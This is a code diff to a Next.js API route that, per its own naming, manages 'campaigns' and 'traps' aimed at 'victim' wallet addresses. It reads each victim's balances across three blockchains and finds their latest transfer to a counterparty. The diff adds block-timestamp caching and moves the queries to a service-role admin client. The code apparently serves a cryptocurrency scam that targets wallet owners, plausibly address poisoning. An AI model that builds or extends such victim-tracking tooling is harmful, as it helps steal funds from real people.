@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { getAuthUser } from '@app-lib/auth';
 import { createServerSupabaseClient } from '@app-lib/supabaseServer';
+import { createClient } from '@supabase/supabase-js';
 import { createPublicClient, http, formatEther, formatUnits, fallback } from 'viem';
 import { mainnet, bsc, polygon } from 'viem/chains';
 
@@ -73,9 +74,20 @@ const PUBLIC_FALLBACKS: Record<string, string[]> = {
   ],
 };
 
-// ─── In‑memory cache for victim balances ───
+// ─── Block timestamp cache ───
+const blockTimestampCache = new Map<string, number>(); // key: `${chainId}-${blockNumber}`
+function getCachedBlockTimestamp(chainId: number, blockNumber: number): number | null {
+  const key = `${chainId}-${blockNumber}`;
+  return blockTimestampCache.get(key) || null;
+}
+function setCachedBlockTimestamp(chainId: number, blockNumber: number, timestamp: number) {
+  const key = `${chainId}-${blockNumber}`;
+  blockTimestampCache.set(key, timestamp);
+}
+
+// ─── Balance cache ───
 const balanceCache = new Map<string, { native: string; tokens: Record<string, string>; timestamp: number }>();
-const CACHE_TTL_MS = 60000; // 1 minute
+const CACHE_TTL_MS = 60000;
 
 function getCachedBalance(address: string) {
   const cached = balanceCache.get(address);
@@ -101,6 +113,10 @@ export async function GET(
   }
 
   const supabase = await createServerSupabaseClient();
+  const supabaseAdmin = createClient(
+    process.env.NEXT_PUBLIC_SUPABASE_URL!,
+    process.env.SUPABASE_SERVICE_ROLE_KEY!
+  );
 
   const { data: campaign, error: campaignError } = await supabase
     .from('campaigns')
@@ -130,7 +146,7 @@ export async function GET(
     return NextResponse.json({ error: trapsError.message }, { status: 500 });
   }
 
-  // ─── Build RPC client with fallback ───
+  // ─── RPC client ───
   const chain = chainMap[campaign.chain as keyof typeof chainMap];
   const rpcUrl = process.env[`${campaign.chain.toUpperCase()}_RPC_URL`] || process.env.NODE_RPC_URL;
   if (!rpcUrl) {
@@ -159,21 +175,18 @@ export async function GET(
     let nativeBalance = '0';
     let tokenBalances: Record<string, string> = {};
 
-    // ─── Check cache ───
     const cached = getCachedBalance(victim);
     if (cached) {
       nativeBalance = cached.native;
       tokenBalances = cached.tokens;
     } else {
-      // ─── Fetch native balance ───
+      // Fetch balances...
       try {
         const balance = await client.getBalance({ address: victim });
         nativeBalance = formatEther(balance);
       } catch (e) {
         console.warn(`[traps] Native balance failed for ${victim}:`, e);
       }
-
-      // ─── Fetch token balances via multicall ───
       if (Object.keys(tokenAddresses).length > 0) {
         try {
           const contractCalls = Object.entries(tokenAddresses).map(([symbol, address]) => ({
@@ -182,10 +195,7 @@ export async function GET(
             functionName: 'balanceOf',
             args: [victim],
           }));
-          const results = await client.multicall({
-            contracts: contractCalls,
-            allowFailure: true,
-          });
+          const results = await client.multicall({ contracts: contractCalls, allowFailure: true });
           results.forEach((result, i) => {
             const symbol = Object.keys(tokenAddresses)[i];
             if (result.status === 'success' && result.result) {
@@ -197,64 +207,87 @@ export async function GET(
           });
         } catch (e) {
           console.warn(`[traps] Multicall failed for ${victim}:`, e);
-          Object.keys(tokenAddresses).forEach((symbol) => {
-            tokenBalances[symbol] = '0';
-          });
+          Object.keys(tokenAddresses).forEach((symbol) => { tokenBalances[symbol] = '0'; });
         }
       }
-
-      // ─── Store in cache ───
       setCachedBalance(victim, nativeBalance, tokenBalances);
     }
 
-    // ─── Last transfer timestamp with chain_id filter ───
-    let lastTransferAt = null;
+    // ─── Last transfer with block timestamp ───
+    let lastTransferAt: string | null = null;
     if (trap.counterparty_address) {
       const victimLower = trap.victim_address.toLowerCase();
       const counterpartyLower = trap.counterparty_address.toLowerCase();
 
-      // 1. Try exact match: victim → counterparty on the same chain
-      const { data: exact, error: exactError } = await supabase
+      // 1. Try exact match (victim → counterparty)
+      const { data: exact, error: exactError } = await supabaseAdmin
         .from('token_transfers')
-        .select('created_at')
-        .eq('sender', victimLower)
-        .eq('receiver', counterpartyLower)
-        .eq('chain_id', chainId)  // ✅ ADD chain_id filter
+        .select('created_at, block_number')
+        .ilike('sender', victimLower)
+        .ilike('receiver', counterpartyLower)
+        .eq('chain_id', chainId)
         .order('created_at', { ascending: false })
         .limit(1);
 
-      if (exactError) {
-        console.warn(`[traps] Exact transfer query error for ${trap.id}:`, exactError);
-      } else if (exact && exact.length > 0) {
-        lastTransferAt = exact[0].created_at;
+      let selectedRow = null;
+      if (!exactError && exact && exact.length > 0) {
+        selectedRow = exact[0];
         console.log(`[traps] Exact match found for ${trap.id}`);
       } else {
-        // 2. Fallback: most recent transfer from victim to ANY address on the same chain
-        const { data: anyTransfer, error: anyError } = await supabase
+        // 2. Fallback: most recent transfer from victim to any address
+        const { data: anyTransfer, error: anyError } = await supabaseAdmin
           .from('token_transfers')
-          .select('receiver, created_at')
-          .eq('sender', victimLower)
-          .eq('chain_id', chainId)  // ✅ ADD chain_id filter
+          .select('created_at, block_number')
+          .ilike('sender', victimLower)
+          .eq('chain_id', chainId)
           .order('created_at', { ascending: false })
           .limit(1);
 
-        if (anyError) {
-          console.warn(`[traps] Any transfer query error for ${trap.id}:`, anyError);
-        } else if (anyTransfer && anyTransfer.length > 0) {
-          lastTransferAt = anyTransfer[0].created_at;
-          console.log(`[traps] Fallback transfer found for ${trap.id} to ${anyTransfer[0].receiver}`);
-        } else {
-          console.log(`[traps] No transfers at all from ${victimLower} on chain ${chainId}`);
+        if (!anyError && anyTransfer && anyTransfer.length > 0) {
+          selectedRow = anyTransfer[0];
+          console.log(`[traps] Fallback transfer found for ${trap.id}`);
         }
+      }
+
+      if (selectedRow) {
+        const blockNumber = selectedRow.block_number;
+        const createdAt = selectedRow.created_at;
+
+        // Try to fetch block timestamp from RPC
+        let timestamp = null;
+        if (blockNumber) {
+          const cached = getCachedBlockTimestamp(chainId, blockNumber);
+          if (cached) {
+            timestamp = cached;
+          } else {
+            try {
+              const block = await client.getBlock({ blockNumber: BigInt(blockNumber) });
+              if (block && block.timestamp) {
+                timestamp = Number(block.timestamp) * 1000; // seconds to ms
+                setCachedBlockTimestamp(chainId, blockNumber, timestamp);
+                console.log(`[traps] Fetched block timestamp for block ${blockNumber}: ${new Date(timestamp).toISOString()}`);
+              }
+            } catch (e) {
+              console.warn(`[traps] Could not fetch block timestamp for block ${blockNumber}:`, e);
+            }
+          }
+        }
+
+        // Use block timestamp if available, otherwise fallback to created_at
+        if (timestamp) {
+          lastTransferAt = new Date(timestamp).toISOString();
+        } else {
+          lastTransferAt = createdAt;
+          console.log(`[traps] Using created_at as fallback for ${trap.id}`);
+        }
+      } else {
+        console.log(`[traps] No transfers at all from ${victimLower} on chain ${chainId}`);
       }
     }
 
     enrichedTraps.push({
       ...trap,
-      victim_balance: {
-        native: nativeBalance,
-        tokens: tokenBalances,
-      },
+      victim_balance: { native: nativeBalance, tokens: tokenBalances },
       last_transfer_at: lastTransferAt,
     });
   }
